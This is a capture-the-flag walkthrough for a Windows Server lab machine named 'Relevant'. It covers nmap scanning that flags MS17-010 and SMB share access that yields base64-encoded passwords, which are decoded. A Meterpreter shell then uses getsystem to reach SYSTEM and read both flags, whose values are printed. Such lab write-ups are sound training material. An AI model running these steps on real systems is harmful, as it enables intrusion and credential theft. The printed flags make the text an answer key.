# Relevant

### Scenario:

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

User.txt
Root.txt
Additionally, the client has provided the following scope allowances:

Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
Locate and note all vulnerabilities found
Submit the flags discovered to the dashboard
Only the IP address assigned to your machine is in scope
Find and report ALL vulnerabilities (yes, there is more than one path to root)
(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.
Note - Nothing in this room requires Metasploit

## Start of with NMAP scan

```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Relevant]
└─$ nmap -Pn -sV -sC 10.49.151.205  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 02:57 AEST
Nmap scan report for 10.49.151.205
Host is up (0.41s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2026-05-15T16:58:22+00:00
|_ssl-date: 2026-05-15T16:59:01+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2026-05-14T16:33:37
|_Not valid after:  2026-11-13T16:33:37
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-15T16:58:23
|_  start_date: 2026-05-15T16:33:35
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-15T09:58:26-07:00
|_clock-skew: mean: 1h23m59s, deviation: 3h07m52s, median: -1s
```                                                                  

Interesting points here:
- Microsoft IIS/10 web server port 80 open but no port 443
- Windows Server 2008 R2 - 2012
- SMB port open
  - user account guest is available  
- RDP port 3389 open

Closer look for vulberabilities with vulners and vuln script. Only vuln showed results:
```
$ nmap -Pn -sV -sC -script=vuln THM_Target
...
Mostly same as before
...
Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```
Interesting points here
- ms17-010 definitely has a RCE capability, eternal blue (CVE-2017-0143)

Nmap -sC only includes a range of common ports so one more for full range of ports
```
└─$ nmap -Pn -p- -sV THM_Target 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 04:36 AEST
Nmap scan report for THM_Target (10.49.137.106)
Host is up (0.41s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```
In browser the IP showed a just a basic IIS web server default page. GoBuster here no directories were discovered on port 80 for website. A second scan for port 49663.

## Starting now with SMB

First see what shares are quickly available:
```
└─$ smbclient -L THM_Target 
Password for [WORKGROUP\hacktopuser]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to THM_Target failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
Sharename nt4wrksv appears to be accessible a quick search finds:
- A single file password.txt.
- no other files or directories accessible.

```
└─$ smbclient \\\\THM_Target\\nt4wrksv
Password for [WORKGROUP\hacktopuser]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 16 03:16:33 2026
  ..                                  D        0  Sat May 16 03:16:33 2026
  passwords.txt                       A       98  Sun Jul 26 01:15:33 2020

                7735807 blocks of size 4096. 5097415 blocks available
smb: \> GET passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
Passwords file did contain 2 passwords:
```
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Relevant]
└─$ cat passwords.txt                                            
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk                                                                             
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Relevant]
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw=="| base64 -d
Bob - !P@$$W0rD!123                                                                             
┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Relevant]
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d    
Bill - Juw4nnaM4n420696969!$$$                        
```
Tried an admin hidden shares but no username, either password wont work here on SMB shares at least.
Closer look with nmap using script on port 135,139,445:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 03:15 AEST
Nmap scan report for THM_Target (10.49.151.205)
Host is up (0.41s latency).

PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.49.151.205\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.49.151.205\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.49.151.205\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.49.151.205\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-15T10:15:09-07:00
```


Meterpreter results
```
meterpreter > shell
Process 972 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>cd /users/Bob/Desktop

c:\Users\Bob\Desktop>type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
c:\Users\Bob\Desktop>exit

#ESCALATE

meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > shell
Process 3532 created.
Channel 2 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>cd /users/Administrator/Desktop

c:\Users\Administrator\Desktop>dir

 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\Users\Administrator\Desktop

07/25/2020  08:24 AM    <DIR>          .
07/25/2020  08:24 AM    <DIR>          ..
07/25/2020  08:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,880,105,472 bytes free

c:\Users\Administrator\Desktop>type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```
